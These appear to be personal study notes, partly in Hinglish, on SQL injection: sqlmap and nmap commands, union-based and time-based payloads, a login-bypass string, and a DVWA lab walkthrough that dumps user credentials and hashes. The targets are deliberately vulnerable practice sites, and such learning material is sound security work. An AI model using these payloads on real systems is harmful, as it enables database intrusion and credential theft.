-------------------------------- imp writeup -------------------------
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
https://www.exploit-db.com/papers/13045          
https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/#SyntaxBasicAttacks 

http://www.securityidiots.com/Web-Pentest/SQL-Injection/
http://www.securityidiots.com/Web-Pentest/SQL-Injection/DIOS-the-SQL-Injectors-Weapon-Upgraded.html 

ye upar wale me link me payloads ye iska in one shot hack hota he reference ke liye musab khan ka video 



https://medium.com/@ismailtasdelen/sql-injection-payload-list-b97656cfd66b       #payloads he 


------------------------ writeup end ---------------------





-----------------------------------tools  ---------------------------------
sql map 
sqlmap -u "url"           -u flag ke age url dalneka 
sqlmap -u "url" --cookie      cookie value add karne ka to login me problem nahi ayegi
sqlmap -u "url" --dbs        database ka list milega 



-------------------------------------tools end ---------------------------

SQL Injection Characters

1	 Character String Indicators	  ‘ or “
2	 Multiple-line comment	       /*….*/
3	 Addition, concatenate          ( or space   in URL)	+
4	 Single-line comment	          # or – -(hyphen hyphen)
5	 Double pipe (concatenate)	        ||
6	 Wildcard attribute indicator	         %
7	 Local variable	                    @variable
8	 Global variable	          @@variable
9	 Time delay	 waitfor delay         ’00:00:10’
10	String instead of a number or vice versa	


Since we are using UNION operator to perform SQL INJECTION, this type of injection is called UNION BASED SQL INJECTION ( a type of ERROR BASED SQL INJECTION)
Union Based SQL Injection

Variable/function	Output
user()	Current User
database()	Current Database
version()	Database Version
schema()	Current Database
UUID()	System UUID Key
current_user()	Current User
system_user()	Current System User
session_user()	Session User
@@hostname	Current Hostname
@@tmpdir	Temporary Directory
@@datadir	Data Directory
@@version	Version of Database
@@basedir	Base Directory
@@GLOBAL.have_symlink	Check if the symlink is Enabled or Disabled
@@GLOBAL.have_ssl	Check if it SSL is available


------------------------------ methodology for hunting -----------
first find a place where database are used like in our login page we used database for checking
username and password 

in input field put sql symbols  
', ", order_by and like this see any error is coming or not 

error aya to samaje ne ka sql he  

order by 1 2 3 ye command dalke kitne columns he dekhneka 

uske badd union based attack chalu karneka uska command - union select 1 2 3

fir ek wrong value dalneka link id=-1 to vo skip hoga agle vale cloumn ka op milega

payload == artist=-1 union select 1,database(),3    isse databse ka nam samjega

payload == artist=-1 union select 1,version(),current_user()      version samjega

payload == artist=-1 union select 1,table_name,3 from information_schema.tables where table_schema=database() limit 0,1  
#table ka nam samjega ye payload se 


UNION based attack 	- sql me union command rahtha he usko use karke 
attack karne ka 


-------------------------------- time based sql injection --------------------
In some cases you won't notice any change on the page you are testing. Therefore, a good way to discover blind SQL injections is making the DB perform actions and will have an impact on the time the page need to load.
Therefore, the we are going to concat in the SQL query an operation that will take a lot of time to complete:

1' + sleep(10)
1' and sleep(10)
1' && sleep(10)
1' | sleep(10)

PostgreSQL (only support string concat)
1' || pg_sleep(10)

MSQL
1' WAITFOR DELAY '0:0:10'

Oracle
1' AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])
1' AND 123=DBMS_PIPE.RECEIVE_MESSAGE('ASD',10)

SQLite
1' AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))
1' AND 123=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))




some useful sql command for injection 

--  #  tp comment the rest of the query
OR Either of the input should be true
AND  both of the input  should be true 
1=1  A statement is always true


to bypass login 

if there is username and password so sql command is 
SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'

if we put the username and add -- comment to password is eliminated automatically 

administrator'--     === payload 







------------------------ sql injection with Nmap --------------- 

NSE script use karke pahele dekhnge ki vulnearable he ki nahi 


nmap -sV --script=http-sql-injection www.testphp.vulnweb.com –p 80









---------------------- Jitesh notes -----------------------------------


SQL Injections
==============
	Where an attacker passes the malicious SQL commands just to gain the juicy information from the database.
	SQLi

UNION BASED SQL INJECTION
=========================
	Where an attacker uses the union command to collect the information and merge it into one table. He passes malicious commands and queries in the database to do so.

DEMO
====
DVWA ---> Security:Low 
			SQL Injection
Step 1
======
To find 'GET' parameter.
	something=something
		php?id=something
		php?id=cat
		php?id=1
		php?id=query

	Either you click on some link of the web application|site or enter something in the search box.

	http://127.0.0.1/dvwa/DVWA-1.0.8/vulnerabilities/sqli/?id=1&Submit=Submit#

Step 2
======
To generate a SQL error, to break the query.
	1
	1'

	http://127.0.0.1/dvwa/DVWA-1.0.8/vulnerabilities/sqli/?id=1'&Submit=Submit#

	You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''1''' at line 1

	'select * from table '
	'select * from table' '

Step 3
======
To count the number of columns, in the web application.
	For counting the number of columns, we will use order by

	http://127.0.0.1/dvwa/DVWA-1.0.8/vulnerabilities/sqli/?id=1' order by 1--+&Submit=Submit#
		Shows us data
		This query means that we are asking the database to arrange the data according to column number 1

	http://127.0.0.1/dvwa/DVWA-1.0.8/vulnerabilities/sqli/?id=1' order by 2--+&Submit=Submit#
		Shows me data
		This query means that we are asking the database to arrange the data according to column number 2

	http://127.0.0.1/dvwa/DVWA-1.0.8/vulnerabilities/sqli/?id=1' order by 3--+&Submit=Submit#
		Gives us an error
			Unknown column '3' in 'order clause'
		This query means that I am asking the database to arrange the data according to column number 3
		But there is no column number 3 --> so it will generate an error

order by n--+
	n starts from 1 and ends when i receive an error for the value of n
	--+ ---> To comment out
			if there is any data passed down after --+, it will not execute at all. we can also use # to comment out the rest content.

	There are 2 columns, in the database.

Step 4
======
To merge the data of all the columns, using UNION command.
	union select 1,2,...,n-1--+
	n=3
	union select 1,2--+


http://127.0.0.1/dvwa/DVWA-1.0.8/vulnerabilities/sqli/?id=1' union select 1,2--+&Submit=Submit#

		ID: 1' union select 1,2-- 
		First name: admin
		Surname: admin

		ID: 1' union select 1,2-- 
		First name: 1
		Surname: 2

http://127.0.0.1/dvwa/DVWA-1.0.8/vulnerabilities/sqli/?id=1' union select database(),version()--+&Submit=Submit#
	
	database() --> database name
	version()  --> Database Version Number

Step 5
======
To call database ki ma --> information_schema, for getting the information about the table names
	Information_schema --> it is meta table --> it contains the name of tables and columns which are present in the database.
		information_schema.tables
					|-> It stores the name of all the table names in the database.

	union select table_name,2 from information_schema.tables--+
					or
	union select 1,table_name from information_schema.tables--+


	We can apply both of them because both the fields are vulnerable otherwise we will go for the one which is vulnerable.

	http://127.0.0.1/dvwa/DVWA-1.0.8/vulnerabilities/sqli/?id=1' union select 1,table_name from information_schema.tables--+&Submit=Submit#

Step 6
======
I will again call database ki maa for columns names in the table names as users
	information_schema
	information_schema.columns

	union select 1,column_name from information_schema.columns where table_name="users"--+


Step 7
======
To retreive or dump data from the above info.
	DVWA --> Users --> (User_id,first_name,Last_name,user,Password)

	union select 1,group_concat(User_id,0x0a,first_name,0x0a,Last_name,0x0a,user,0x0a,Password,0x3a) from users--+



Password is in hashed form so we will go online and check if the hash value of the value is availble or not.

